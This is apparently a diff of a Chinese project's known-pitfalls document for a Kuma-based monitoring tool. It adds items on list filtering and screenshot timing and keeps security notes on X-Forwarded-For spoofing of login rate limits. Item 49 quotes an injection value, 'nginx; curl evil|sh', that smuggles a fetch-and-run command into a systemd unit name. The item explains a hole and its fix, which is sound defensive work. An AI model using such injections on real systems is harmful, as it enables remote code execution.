@@ -1,4 +1,4 @@
-# pinboard 已知问题与坑（54 条）
+# pinboard 已知问题与坑（56 条）
 
 > 2026-10-21 从 `AGENTS.md` 搬出来（那份文件逼近 DSH 工作区指令 65536 B 预算，超了会被整份丢弃）。
 > **编号是稳定契约**：`AGENTS.md` 的模块说明、`web/`、`server/` 注释里的「见坑 18」都指这里的第 18 条——**新增只能往后加，不要重排、不要插号**。
@@ -74,7 +74,7 @@
 
 47. **观测项从 socket 拿回来的 bean 是 camelCase，库里的列名才是 snake_case**（2026-10-26 做 06 风味探测时踩的）：fork 的库里列叫 `policy_json`，但 `getMonitorList` 推回来的 bean 只有 `policyJson`（`server/model/monitor.js` 的 toJSON 走 camelCase），拿 `'policy_json' in bean` 判定永远 false → 自家 fork 被判成 upstream，「立即观测」整段不渲染。同理 **Hono 按注册顺序匹配**：`/meta` 必须写在 `/:id` **之前**（`server/kuma/routes.ts`），否则 `meta` 会被当成 id。
 
-48. **反代后面取客户端 IP，要取 `X-Forwarded-For` 的最后一段**（2026-10-26 安全审查时发现的）：`server/auth/middleware.ts` 原来取第一段 `xff.split(',')[0]`，而 `docs/deploy.md:51` 推荐的 nginx 写法是 `$proxy_add_x_forwarded_for`——客户端自带的值排在**最前**，真实来源追加在最后。结果是攻击者每次换一个 `X-Forwarded-For` 就是一条新 IP，登录限流（同 IP 15 分钟 5 次）等于没有：实测连续 12 次错密码全是 401，一次 429 都没触发。改成 `pickClientIp()` 取最后一段后，同样的「伪造前段 + 真实后段」5 次就 429。**只有 `TRUST_PROXY=1` 才读这个头**，直连时用 socket 地址。
+48. **反代后面取客户端 IP，要取 `X-Forwarded-For` 的最后一段**（2026-10-26 安全审查时发现的）：`server/auth/middleware.ts` 原来取第一段 `xff.split(',')[0]`，而 `docs/deploy.zh.md:51` 推荐的 nginx 写法是 `$proxy_add_x_forwarded_for`——客户端自带的值排在**最前**，真实来源追加在最后。结果是攻击者每次换一个 `X-Forwarded-For` 就是一条新 IP，登录限流（同 IP 15 分钟 5 次）等于没有：实测连续 12 次错密码全是 401，一次 429 都没触发。改成 `pickClientIp()` 取最后一段后，同样的「伪造前段 + 真实后段」5 次就 429。**只有 `TRUST_PROXY=1` 才读这个头**，直连时用 socket 地址。
 
 49. **systemd 单元名会拼进 Kuma 的 `ssh_command`，必须卡字符集**（同一天）：`server/kuma/provision.ts` 的 `ssh_command: 'systemctl is-active ' + unit`，`unit` 来自「添加主机」的请求体，而 Kuma 在目标机上**按 shell 执行**这条命令 → `nginx; curl evil|sh` 就是远程命令执行。现在加 `const UNIT_RE = /^[A-Za-z0-9_.@:-]+$/`。凡是「把字符串拼给别处当命令跑」的地方，都按这个套路先卡白名单，别指望调用方自觉。
 
@@ -87,3 +87,7 @@
 53. **`document.documentElement.scrollHeight` 量不出滚动**（同一天）：本项目的滚动容器是 `shell.css` 里的 `.content { flex:1; overflow-y:auto }`，`documentElement` 的高度恒等于视口，于是「一屏放不放得下」永远量成「放得下」。要量 `.content` 的 `scrollHeight` vs `clientHeight`（`tools/screenshots/shot-services.mjs` 的 `metrics()` 就是这么做的，另加 `usedHeight` 量内容实际占到哪）。
 
 54. **「每个实体一张卡」在列表视角会自己顶破一屏**（同一天）：服务视角最初照服务器视角做成卡片，23 个服务 = 23 张卡，光卡片头（标题 + IP + 条数）就吃掉 121px，比单行多出一屏（963 > 842）。**服务视角改成一个服务一行**（`.svc-slist` 两列网格，行里排部署机名），行内别再放带框的小标签——3 台机 + 长 IP（`127.0.0.1:7863`）会换行把行高撑成两倍，纯文本机名 + `·` 分隔就够。同理紧凑行不要加第二行路径：加了以后服务视角 963px 直接超出一屏。
+55. **列表按「有关联才显示」过滤，会把新建的和删空的条目变没**（2026-10-26 做服务页增删改时踩到）：`groupByService` 原来只给「真部署过」的服务出行，于是页面里「加服务」保存成功、抽屉一关，那个服务**在界面上根本不出现**（统计行也不涨）；更糟的是把某个服务的最后一条部署删掉，它就再也找不到了——只能手改 JSON。凡是能在页面上新建 / 删除的实体，列表必须按**清单**出（服务视角里 0 台的也出一行，写「还没部署」+ 右边 `+` 直接挑机器），统计数字也按清单算。验收时别只看「保存没报错」，要**看得见那条新数据**、并且把关联删空之后**仍然能删掉它**。
+
+56. **弹层截图要等 `pop` / `slide` 动画跑完**（同一天）：`overlay.css` 的 `.modal-card` 是 `animation: pop 0.18s`（`from { opacity: 0 }`），抽屉是 `slide 0.2s`。`waitForSelector('.modal')` 只等元素挂上 DOM，立刻 `screenshot()` 会拍到**半透明弹层 + 没压暗的背景**，看起来像「遮罩没生效」的 bug。脚本里在截图前 `waitForTimeout(300~350)`（或 `waitForFunction` 查 `getComputedStyle(el).opacity === '1'`）再拍。
+
